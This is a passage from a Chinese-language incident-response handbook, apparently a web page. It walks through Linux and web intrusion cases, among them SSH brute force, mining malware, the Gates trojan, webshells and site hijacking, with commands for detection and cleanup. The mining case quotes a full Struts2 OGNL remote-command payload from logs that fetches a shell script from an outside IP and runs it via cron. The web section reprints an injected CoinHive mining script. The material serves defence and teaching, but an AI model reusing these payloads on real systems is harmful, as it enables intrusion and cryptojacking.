class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)"|uniq -c | sort -nr <span class="hljs-code">    12622 23.91.xxx.xxx</span><span class="hljs-code">     8942 114.104.xxx.xxx</span><span class="hljs-code">     8122 111.13.xxx.xxx</span><span class="hljs-code">     7525 123.59.xxx.xxx</span><span class="hljs-code">     ...................</span><span class="hljs-code">    </span>4、爆破用户名字典都有哪些？[root@localhost ~]# grep "Failed password" /var/log/secure|perl -e 'while($_=<span class="xml"><span class="hljs-tag">&lt;&gt;</span></span>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr<span class="hljs-code">      9402  root</span><span class="hljs-code">      3265  invalid user oracle</span><span class="hljs-code">      1245  invalid user admin</span><span class="hljs-code">      1025  invalid user user</span><span class="hljs-code">      .....................</span></code></pre><p><strong>C、管理员最近登录情况：</strong></p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、登录成功的日期、用户名、IP：[<span class="hljs-symbol">root@</span>localhost ~]# grep <span class="hljs-string">"Accepted "</span> /var/log/secure | awk <span class="hljs-string">'{print $1,$2,$3,$9,$11}'</span> Jul <span class="hljs-number">9</span> <span class="hljs-number">09</span>:<span class="hljs-number">38</span>:<span class="hljs-number">09</span> root <span class="hljs-number">192.168</span><span class="hljs-number">.143</span><span class="hljs-number">.100</span>Jul <span class="hljs-number">9</span> <span class="hljs-number">14</span>:<span class="hljs-number">55</span>:<span class="hljs-number">51</span> root <span class="hljs-number">192.168</span><span class="hljs-number">.143</span><span class="hljs-number">.100</span>Jul <span class="hljs-number">10</span> <span class="hljs-number">08</span>:<span class="hljs-number">54</span>:<span class="hljs-number">26</span> root <span class="hljs-number">192.168</span><span class="hljs-number">.143</span><span class="hljs-number">.100</span>Jul <span class="hljs-number">10</span> <span class="hljs-number">16</span>:<span class="hljs-number">25</span>:<span class="hljs-number">59</span> root <span class="hljs-number">192.168</span><span class="hljs-number">.143</span><span class="hljs-number">.100</span>............................通过登录日志分析，并未发现异常登录时间和登录IP。<span class="hljs-number">2</span>、顺便统计一下登录成功的IP有哪些：[<span class="hljs-symbol">root@</span>localhost ~]# grep <span class="hljs-string">"Accepted "</span> /var/log/secure | awk <span class="hljs-string">'{print $11}'</span> | sort | uniq -c | sort -nr | more     <span class="hljs-number">27</span> <span class="hljs-number">192.168</span><span class="hljs-number">.204</span><span class="hljs-number">.1</span></code></pre><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="0x04-处理措施-1"><a href="#0x04-处理措施-1" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="hljs-number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。<span class="hljs-number">2</span>、更改服务器ssh默认端口。<span class="hljs-number">3</span>、部署入侵检测设备，增强安全防护。</code></pre><h2 id="第2篇：捕捉短连接"><a href="#第2篇：捕捉短连接" class="headerlink" title="第2篇：捕捉短连接"></a>第2篇：捕捉短连接</h2><h3 id="0x00-前言-13"><a href="#0x00-前言-13" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p><h3 id="0x01-应急场景-6"><a href="#0x01-应急场景-6" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网络管理员在出口WAF检测到某台服务器不断向香港I发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。</p><h3 id="0x02-日志分析-2"><a href="#0x02-日志分析-2" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p>​    登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。 </p><p><img src="/image/linux-11-1.png" srcset="/img/loading.gif" alt=""></p><p>手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。</p><p>脚本文件如下：</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>ip=118.184.15.40i=1<span class="hljs-keyword">while</span> :<span class="hljs-keyword">do</span>   tmp=netstat -anplt|grep <span class="hljs-variable">$ip</span>|awk -F <span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span>|awk <span class="hljs-string">'{print $7}'</span>   <span class="hljs-comment">#echo $tmp</span>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -z <span class="hljs-string">"<span class="hljs-variable">$tmp</span>"</span>   <span class="hljs-keyword">then</span>       ((i=i+1))    <span class="hljs-keyword">else</span>       <span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> <span class="hljs-variable">$tmp</span>; <span class="hljs-keyword">do</span>           <span class="hljs-built_in">echo</span> <span class="hljs-string">"PID: "</span><span class="hljs-variable">${pid}</span>          result=ls -lh /proc/<span class="hljs-variable">$pid</span>|grep exe          <span class="hljs-built_in">echo</span> <span class="hljs-string">"Process: "</span><span class="hljs-variable">${result}</span>          <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$pid</span>       <span class="hljs-keyword">done</span>       <span class="hljs-built_in">break</span>   <span class="hljs-keyword">fi</span> <span class="hljs-keyword">done</span><span class="hljs-built_in">echo</span> <span class="hljs-string">"Total number of times: "</span><span class="hljs-variable">${i}</span></code></pre><p>运行结果如下： </p><p><img src="/image/linux-11-2.png" srcset="/img/loading.gif" alt=""></p><p>跑了三次脚本，可以发现短连接每次发起的进程Pid一直在变，但已经捕捉到发起该异常连接的进程源文件为 /usr/lib/nfsiod</p><h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>​    本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。</p><h2 id="第3篇：挖矿病毒"><a href="#第3篇：挖矿病毒" class="headerlink" title="第3篇：挖矿病毒"></a>第3篇：挖矿病毒</h2><h3 id="0x00-前言-14"><a href="#0x00-前言-14" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。</p><h3 id="0x01-应急场景-7"><a href="#0x01-应急场景-7" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：</p><p><img src="/image/linux-12-1.png" srcset="/img/loading.gif" alt=""></p><p>###0x02 事件分析</p><h4 id="A、排查过程"><a href="#A、排查过程" class="headerlink" title="A、排查过程"></a>A、排查过程</h4><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :</p><p><img src="/image/linux-12-2.png" srcset="/img/loading.gif" alt=""></p><p><img src="/image/linux-12-3.png" srcset="/img/loading.gif" alt=""></p><p>下载logo.jpg，包含脚本内容如下：</p><p><img src="/image/linux-12-4.png" srcset="/img/loading.gif" alt="">    </p><p>到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？</p><p>通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。</p><p><img src="/image/linux-12-5.png" srcset="/img/loading.gif" alt=""></p><h4 id="B、溯源分析"><a href="#B、溯源分析" class="headerlink" title="B、溯源分析"></a>B、溯源分析</h4><p>​    在Tomcat log日志中，我们找到这样一条记录：</p><p><img src="/image/linux-12-6.png" srcset="/img/loading.gif" alt=""></p><p>对日志中攻击源码进行摘录如下： </p><p><code>{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo "*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</code></p><p>可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。</p><h4 id="C、清除病毒"><a href="#C、清除病毒" class="headerlink" title="C、清除病毒"></a>C、清除病毒</h4><p>1、删除定时任务:</p><p><img src="/image/linux-12-7.png" srcset="/img/loading.gif" alt=""></p><p>2、终止异常进程:</p><p><img src="/image/linux-12-8.png" srcset="/img/loading.gif" alt=""></p><h4 id="D、漏洞修复"><a href="#D、漏洞修复" class="headerlink" title="D、漏洞修复"></a>D、漏洞修复</h4><p>​    升级struts到最新版本 </p><h3 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h3><p>​    针对服务器被感染挖矿程序的现象，总结了几种预防措施：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护<span class="hljs-number">2</span>、及时更新 Windows安全补丁，开启防火墙临时关闭端口<span class="hljs-number">3</span>、及时更新web漏洞补丁，升级web组件</code></pre><h2 id="第4篇：盖茨木马"><a href="#第4篇：盖茨木马" class="headerlink" title="第4篇：盖茨木马"></a>第4篇：盖茨木马</h2><h3 id="0x00-前言-15"><a href="#0x00-前言-15" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    Linux盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的DDoS木马，主要恶意特点是具备了后门程序，DDoS攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用Gates这个单词。分析和清除盖茨木马的过程，可以发现有很多值得去学习和借鉴的地方。</p><h3 id="0x01-应急场景-8"><a href="#0x01-应急场景-8" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网站管理员发现服务器CPU资源异常，几个异常进程占用大量网络带宽：</p><p><img src="/image/linux-13-1.png" srcset="/img/loading.gif" alt=""> </p><h3 id="0x02-事件分析-4"><a href="#0x02-事件分析-4" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p><strong>异常IP连接：</strong></p><p><img src="/image/linux-13-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>异常进程：</strong></p><p>​         查看进行发现ps aux进程异常，进入该目录发现多个命令，猜测命令可能已被替换</p><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :</p><p><img src="/image/linux-13-3.png" srcset="/img/loading.gif" alt=""></p><p><strong>异常启动项</strong></p><p>进入rc3.d目录可以发现多个异常进行：</p><p>/etc/rc.d/rc3.d/S97DbSecuritySpt</p><p>/etc/rc.d/rc3.d/S99selinux</p><p><img src="/image/linux-13-4.png" srcset="/img/loading.gif" alt=""></p><p><img src="/image/linux-13-5.png" srcset="/img/loading.gif" alt=""></p><p><strong>搜索病毒原体</strong></p><p>find / -size -1223124c -size +1223122c -exec ls -id {} ;   搜索1223123大小的文件 </p><p><img src="/image/linux-13-6.png" srcset="/img/loading.gif" alt=""></p><p>从以上种种行为发现该病毒与“盖茨木马”有点类似，具体技术分析细节详见：</p><blockquote><p>Linux平台“盖茨木马”分析</p><p><a href="http://www.freebuf.com/articles/system/117823.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/117823.html</a></p><p>悬镜服务器卫士丨Linux平台“盖茨木马”分析</p><p><a href="http://www.sohu.com/a/117926079_515168" target="_blank" rel="noopener">http://www.sohu.com/a/117926079_515168</a></p></blockquote><p>手动清除木马过程： </p><pre><code class="hljs jboss-cli">1、简单判断有无木马<span class="hljs-comment">#有无下列文件</span>cat <span class="hljs-string">/etc/rc.d/init.d/selinux</span>cat <span class="hljs-string">/etc/rc.d/init.d/DbSecuritySpt</span><span class="hljs-keyword">ls</span> <span class="hljs-string">/usr/bin/bsd-port</span><span class="hljs-keyword">ls</span> <span class="hljs-string">/usr/bin/dpkgd</span><span class="hljs-comment">#查看大小是否正常</span><span class="hljs-keyword">ls</span> -lh <span class="hljs-string">/bin/netstat</span><span class="hljs-keyword">ls</span> -lh <span class="hljs-string">/bin/ps</span><span class="hljs-keyword">ls</span> -lh <span class="hljs-string">/usr/sbin/lsof</span><span class="hljs-keyword">ls</span> -lh <span class="hljs-string">/usr/sbin/ss</span>2、上传如下命令到<span class="hljs-string">/root</span>下ps netstat ss lsof3、删除如下目录及文件rm -rf <span class="hljs-string">/usr/bin/dpkgd</span> <span class="hljs-params">(ps netstat lsof ss)</span>rm -rf <span class="hljs-string">/usr/bin/bsd-port</span>     <span class="hljs-comment">#木马程序</span>rm -f <span class="hljs-string">/usr/bin/.sshd</span>         <span class="hljs-comment">#木马后门</span>rm -f <span class="hljs-string">/tmp/gates.lod</span>rm -f <span class="hljs-string">/tmp/moni.lod</span>rm -f <span class="hljs-string">/etc/rc.d/init.d/DbSecuritySpt</span><span class="hljs-params">(启动上述描述的那些木马变种程序)</span>rm -f <span class="hljs-string">/etc/rc.d/rc1.d/S97DbSecuritySpt</span>rm -f <span class="hljs-string">/etc/rc.d/rc2.d/S97DbSecuritySpt</span>rm -f <span class="hljs-string">/etc/rc.d/rc3.d/S97DbSecuritySpt</span>rm -f <span class="hljs-string">/etc/rc.d/rc4.d/S97DbSecuritySpt</span>rm -f <span class="hljs-string">/etc/rc.d/rc5.d/S97DbSecuritySpt</span>rm -f <span class="hljs-string">/etc/rc.d/init.d/selinux</span><span class="hljs-params">(默认是启动/usr/bin/bsd-port/getty)</span>rm -f <span class="hljs-string">/etc/rc.d/rc1.d/S99selinux</span>rm -f <span class="hljs-string">/etc/rc.d/rc2.d/S99selinux</span>rm -f <span class="hljs-string">/etc/rc.d/rc3.d/S99selinux</span>rm -f <span class="hljs-string">/etc/rc.d/rc4.d/S99selinux</span>rm -f <span class="hljs-string">/etc/rc.d/rc5.d/S99selinux</span>4、找出异常程序并杀死5、删除含木马命令并重新安装</code></pre><h3 id="0x03-命令替换"><a href="#0x03-命令替换" class="headerlink" title="0x03 命令替换"></a>0x03 命令替换</h3><p><strong>RPM check检查：</strong></p><pre><code class="hljs lasso">系统完整性也可以通过rpm自带的<span class="hljs-params">-Va</span>来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查./rpm <span class="hljs-params">-Va</span> &gt; rpm.<span class="hljs-keyword">log</span>如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是<span class="hljs-number">8</span>位长字符串, <span class="hljs-string">``</span>c 用以指配置文件, 接着是文件名. <span class="hljs-number">8</span>位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。<span class="hljs-string">``</span>. (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：</code></pre><p><img src="/image/linux-13-7.png" srcset="/img/loading.gif" alt=""></p><p><strong>命令替换：</strong></p><pre><code class="hljs properties"><span class="hljs-attr">rpm2cpio</span> <span class="hljs-string">包全名 |  cpio -idv .文件绝对路径   rpm包中文件提取</span><span class="hljs-attr">Rpm2cpio</span>  <span class="hljs-string">将rpm包转换为cpio格式的命令 </span><span class="hljs-attr">Cpio</span> <span class="hljs-string">是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件</span><span class="hljs-attr">Cpio</span> <span class="hljs-string">选项 &lt; [文件|设备]</span><span class="hljs-attr">-i：copy-in模式，还原</span><span class="hljs-attr">-d：还原时自动新建目录</span><span class="hljs-attr">-v：显示还原过程</span></code></pre><p>文件提取还原案例： </p><pre><code class="hljs jboss-cli">rpm  -qf <span class="hljs-string">/bin/ls</span>  查询<span class="hljs-keyword">ls</span>命令属于哪个软件包mv  <span class="hljs-string">/bin/ls</span> <span class="hljs-string">/tmp</span>  rpm2cpio <span class="hljs-string">/mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm</span> | cpio -idv <span class="hljs-string">./bin/ls</span> 提取rpm包中<span class="hljs-keyword">ls</span>命令到当前目录的<span class="hljs-string">/bin/ls</span>下cp <span class="hljs-string">/root/bin/ls</span>  <span class="hljs-string">/bin/</span> 把<span class="hljs-keyword">ls</span>命令复制到<span class="hljs-string">/bin/</span>目录 修复文件丢失挂载命令rpm包：mkdir  <span class="hljs-string">/mnt/chrom/</span>  建立挂载点mount -t iso9660 <span class="hljs-string">/dev/cdrom</span>  <span class="hljs-string">/mnt/cdrom/</span>  挂在光盘mount/dev/sr0 <span class="hljs-string">/mnt/cdrom/</span>卸载命令umount  设备文件名或挂载点umount <span class="hljs-string">/mnt/cdrom/</span></code></pre><p><img src="/image/linux-13-8.png" srcset="/img/loading.gif" alt=""></p><h2 id="第5篇：DDOS病毒"><a href="#第5篇：DDOS病毒" class="headerlink" title="第5篇：DDOS病毒"></a>第5篇：DDOS病毒</h2><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>某服务器网络资源异常,感染该木马病毒的服务器会占用网络带宽，甚至影响网络业务正常应用。</p><h3 id="系统分析"><a href="#系统分析" class="headerlink" title="系统分析"></a>系统分析</h3><p>针对日志服务器病毒事件排查情况：<br>在开机启动项/etc/rc.d/rc.local发现可疑的sh.sh脚本，进一步跟踪sh.sh脚本,这是一个检测病毒十分钟存活的脚本。</p><p>在root目录下发现存活检测脚本</p><p><img src="/image/linux-14-1.png" srcset="/img/loading.gif" alt=""></p><p>解决步骤：</p><ol><li>结束进程 ps aux | grep “conf.m” | grep -v grep | awk ‘{print $2}‘| xargs kill -9 </li><li>清除自动启动脚本 vim /etc/rc.local 去掉 sh /etc/chongfu.sh &amp; </li><li>清除 脚本 rm -rf /etc/chongfu.sh /tem/chongfu.sh </li><li>修改登录密码 passwd </li><li>重启。 reboot</li></ol><h1 id="第六章：Web实战篇"><a href="#第六章：Web实战篇" class="headerlink" title="第六章：Web实战篇"></a>第六章：Web实战篇</h1><h2 id="第1篇：网站被植入Webshell"><a href="#第1篇：网站被植入Webshell" class="headerlink" title="第1篇：网站被植入Webshell"></a>第1篇：网站被植入Webshell</h2><p>网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。</p><h3 id="现象描述-1"><a href="#现象描述-1" class="headerlink" title="现象描述"></a>现象描述</h3><p>网站管理员在站点目录下发现存在webshell，于是开始了对入侵过程展开了分析。</p><p><img src="/image/1-1.png" srcset="/img/loading.gif" alt=""></p><p>Webshell查杀工具：</p><p>D盾_Web查杀<br>Window下webshell查杀：<a href="http://www.d99net.net/index.asp" target="_blank" rel="noopener">http://www.d99net.net/index.asp</a></p><p>河马：支持多平台，但是需要联网环境。</p><p>使用方法:<br>wget <a href="http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz" target="_blank" rel="noopener">http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz</a><br>tar xvf hm-linux-amd64.tgz<br>hm scan  /www</p><h3 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h3><h4 id="1、-定位时间范围"><a href="#1、-定位时间范围" class="headerlink" title="1、 定位时间范围"></a>1、 <strong>定位时间范围</strong></h4><p>通过发现的webshell文件创建时间点，去翻看相关日期的访问日志。</p><p><img src="/image/1-2.png" srcset="/img/loading.gif" alt=""></p><h4 id="2、Web-日志分析"><a href="#2、Web-日志分析" class="headerlink" title="2、Web 日志分析"></a>2、Web 日志分析</h4><p>经过日志分析，在文件创建的时间节点并未发现可疑的上传，但发现存在可疑的webservice接口</p><p><img src="/image/1-3.png" srcset="/img/loading.gif" alt=""></p><h4 id="3、漏洞分析"><a href="#3、漏洞分析" class="headerlink" title="3、漏洞分析"></a>3、漏洞分析</h4><p>访问webservice接口，发现变量：buffer、distinctpach、newfilename可以在客户端自定义</p><p><img src="/image/1-4.png" srcset="/img/loading.gif" alt=""></p><h4 id="4、漏洞复现"><a href="#4、漏洞复现" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h4><p>尝试对漏洞进行复现，可成功上传webshell，控制网站服务器</p><p><img src="/image/1-5.png" srcset="/img/loading.gif" alt=""></p><p><img src="/image/1-6.png" srcset="/img/loading.gif" alt=""></p><h4 id="5、漏洞修复"><a href="#5、漏洞修复" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h4><p>清除webshell并对webservice接口进行代码修复。</p><p>从发现webshell到日志分析，再到漏洞复现和修复，本文暂不涉及溯源取证方面。</p><h2 id="第2篇：门罗币恶意挖矿"><a href="#第2篇：门罗币恶意挖矿" class="headerlink" title="第2篇：门罗币恶意挖矿"></a>第2篇：门罗币恶意挖矿</h2><p>门罗币(Monero 或 XMR)，它是一个非常注重于隐私、匿名性和不可跟踪的加密数字货币。只需在网页中配置好js脚本，打开网页就可以挖矿，是一种非常简单的挖矿方式，而通过这种恶意挖矿获取数字货币是黑灰色产业获取收益的重要途径。</p><h3 id="现象描述-2"><a href="#现象描述-2" class="headerlink" title="现象描述"></a>现象描述</h3><p>利用XMR恶意挖矿，会大量占用用户的CPU资源，严重影响了网站的用户体验。</p><p>从08/09日0点开始，局域网内某IP访问网站页面会触发安全预警，只要访问此服务器上的网页，CPU直线上升100%</p><p><img src="/image/2-5.jpg" srcset="/img/loading.gif" alt=""></p><h3 id="问题解析"><a href="#问题解析" class="headerlink" title="问题解析"></a>问题解析</h3><p>通过获取恶意网页url，对网页页面进行分析，发现网站页面被植入在线门罗币挖矿代码：</p><p><code>&lt;script&gt;      var script = document.createElement('script');      script.onload = function () {          // XMR Pool hash          var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu');         // TODO: Replace the below string with wallet string          m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK');      };      script.src = 'https://coinhive.com/lib/coinhive.min.js';      document.head.appendChild(script);  &lt;/script&gt;</code></p><p>删除js里面的恶意代码，网站被XMR 恶意挖矿，服务器已经被攻击，进一步做服务器入侵排查。</p><h2 id="第3篇：批量挂黑页"><a href="#第3篇：批量挂黑页" class="headerlink" title="第3篇：批量挂黑页"></a>第3篇：批量挂黑页</h2><p>作为一个网站管理员，你采用开源CMS做网站，比如dedecms，但是有一天，你忽然发现不知何时，网站的友情链接模块被挂大量垃圾链接，网站出现了很多不该有的目录，里面全是博彩相关的网页。而且，攻击者在挂黑页以后，会在一些小论坛注册马甲将你的网站黑页链接发到论坛，引爬虫收录。在搜索引擎搜索网站地址时，收录了一些会出现一些博彩页面，严重影响了网站形象。    </p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>网站存在高危漏洞，常见于一些存在安全漏洞的开源CMS，利用0day批量拿站上传黑页。</p><h3 id="现象描述："><a href="#现象描述：" class="headerlink" title="现象描述："></a>现象描述：</h3><p>某网站被挂了非常多博彩链接，链接形式如下：</p><p>​        <a href="http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html" target="_blank" rel="noopener">http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html</a></p><p>​        <a href="http://www.xxx.com/upload/aomendduchangzaixian/index.html" target="_blank" rel="noopener">http://www.xxx.com/upload/aomendduchangzaixian/index.html</a></p><p>​        <a href="http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html" target="_blank" rel="noopener">http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html</a></p><p>链接可以访问，直接访问物理路径也可以看到文件，但是打开网站目录并没有发现这些文件，这些文件到底藏在了哪？</p><p>访问这些链接，跳转到如图页面：</p><p> <img src="/image/3-1.png" srcset="/img/loading.gif" alt=""></p><h3 id="问题处理："><a href="#问题处理：" class="headerlink" title="问题处理："></a>问题处理：</h3><p>1、打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="/image/3-2.png" srcset="/img/loading.gif" alt=""></p><p>2、再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面</p><p><img src="/image/3-3.png" srcset="/img/loading.gif" alt=""></p><p>3、然后清除IIS临时压缩文件</p><p>C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD</p><p><img src="/image/3-4.png" srcset="/img/loading.gif" alt=""></p><p>4、投诉快照，申请删除相关的网页收录，减少对网站的影响。</p><h2 id="第4篇：新闻源网站劫持"><a href="#第4篇：新闻源网站劫持" class="headerlink" title="第4篇：新闻源网站劫持"></a>第4篇：新闻源网站劫持</h2><p>新闻源网站一般权重较高，收录快，能够被搜索引擎优先收录，是黑灰产推广引流的必争之地，很容易成为被攻击的对象。被黑以后主要挂的不良信息内容主要是博彩六合彩等赌博类内容，新闻源网站程序无论是自主开发的还是开源程序，都有被黑的可能，开源程序更容易被黑。</p><h3 id="现象描述：-1"><a href="#现象描述：-1" class="headerlink" title="现象描述："></a>现象描述：</h3><p>某新闻源网站首页广告链接被劫持到菠菜网站</p><p><img src="/image/4-1.png" srcset="/img/loading.gif" alt=""></p><p>有三个广告专题，链接形式如下：</p><p>​    <a href="http://www.xxx.cn/zhuanti/yyysc/index.shtml" target="_blank" rel="noopener">http://www.xxx.cn/zhuanti/yyysc/index.shtml</a></p><p>​    <a href="http://www.xxx.cn/zhuanti/wwwsc/index.shtml" target="_blank" rel="noopener">http://www.xxx.cn/zhuanti/wwwsc/index.shtml</a></p><p>​    <a href="http://www.xxx.cn/zhuanti/zzzsc/index.shtml" target="_blank" rel="noopener">http://www.xxx.cn/zhuanti/zzzsc/index.shtml</a></p><p>点击这三条链接会跳转到博彩网站。简单抓包分析一下过程：</p><p><img src="/image/4-2.png" srcset="/img/loading.gif" alt=""></p><p>可以发现此时这个返回页面已被劫持，并且加载了第三方js文件，<a href="http://xn--dpqw2zokj.com/N/js/dt.js，进一步访问该文件：" target="_blank" rel="noopener">http://xn--dpqw2zokj.com/N/js/dt.js，进一步访问该文件：</a></p><p><img src="/image/4-3.png" srcset="/img/loading.gif" alt=""></p><p>dt.js进一步加载了另一条js，访问<a href="http://xn--dpqw2zokj.com/N/js/yz.js" target="_blank" rel="noopener">http://xn--dpqw2zokj.com/N/js/yz.js</a></p><p><img src="/image/4-4.png" srcset="/img/loading.gif" alt=""></p><p>我们发现链接跳转到<a href="https://lemcoo.com/?dt，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。" target="_blank" rel="noopener">https://lemcoo.com/?dt，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。</a></p><p><img src="/image/4-5.png" srcset="/img/loading.gif" alt=""></p><h3 id="问题处理：-1"><a href="#问题处理：-1" class="headerlink" title="问题处理："></a>问题处理：</h3><p>找到url对应的文件位置，即使文件被删除，链接依然可以访问，可以发现三条链接都是以“sc”后缀。</p><p>对Nginx配置文件进行排查，发现Nginx配置文件VirtualHost.conf被篡改，通过反向代理匹配以“sc”后缀的专题链接，劫持到<a href="http://103.233.248.163" target="_blank" rel="noopener">http://103.233.248.163</a>，该网站为博彩链接导航网站。</p><p><img src="/image/4-6.png" srcset="/img/loading.gif" alt=""></p><p>删除恶意代理后，专题链接访问恢复。</p><h2 id="第5篇：移动端劫持"><a href="#第5篇：移动端劫持" class="headerlink" title="第5篇：移动端劫持"></a>第5篇：移动端劫持</h2><p>PC端访问正常，移动端访问出现异常，比如插入弹窗、嵌入式广告和跳转到第三方网站，将干扰用户的正常使用，对用户体验造成极大伤害。</p><h3 id="现象描述-3"><a href="#现象描述-3" class="headerlink" 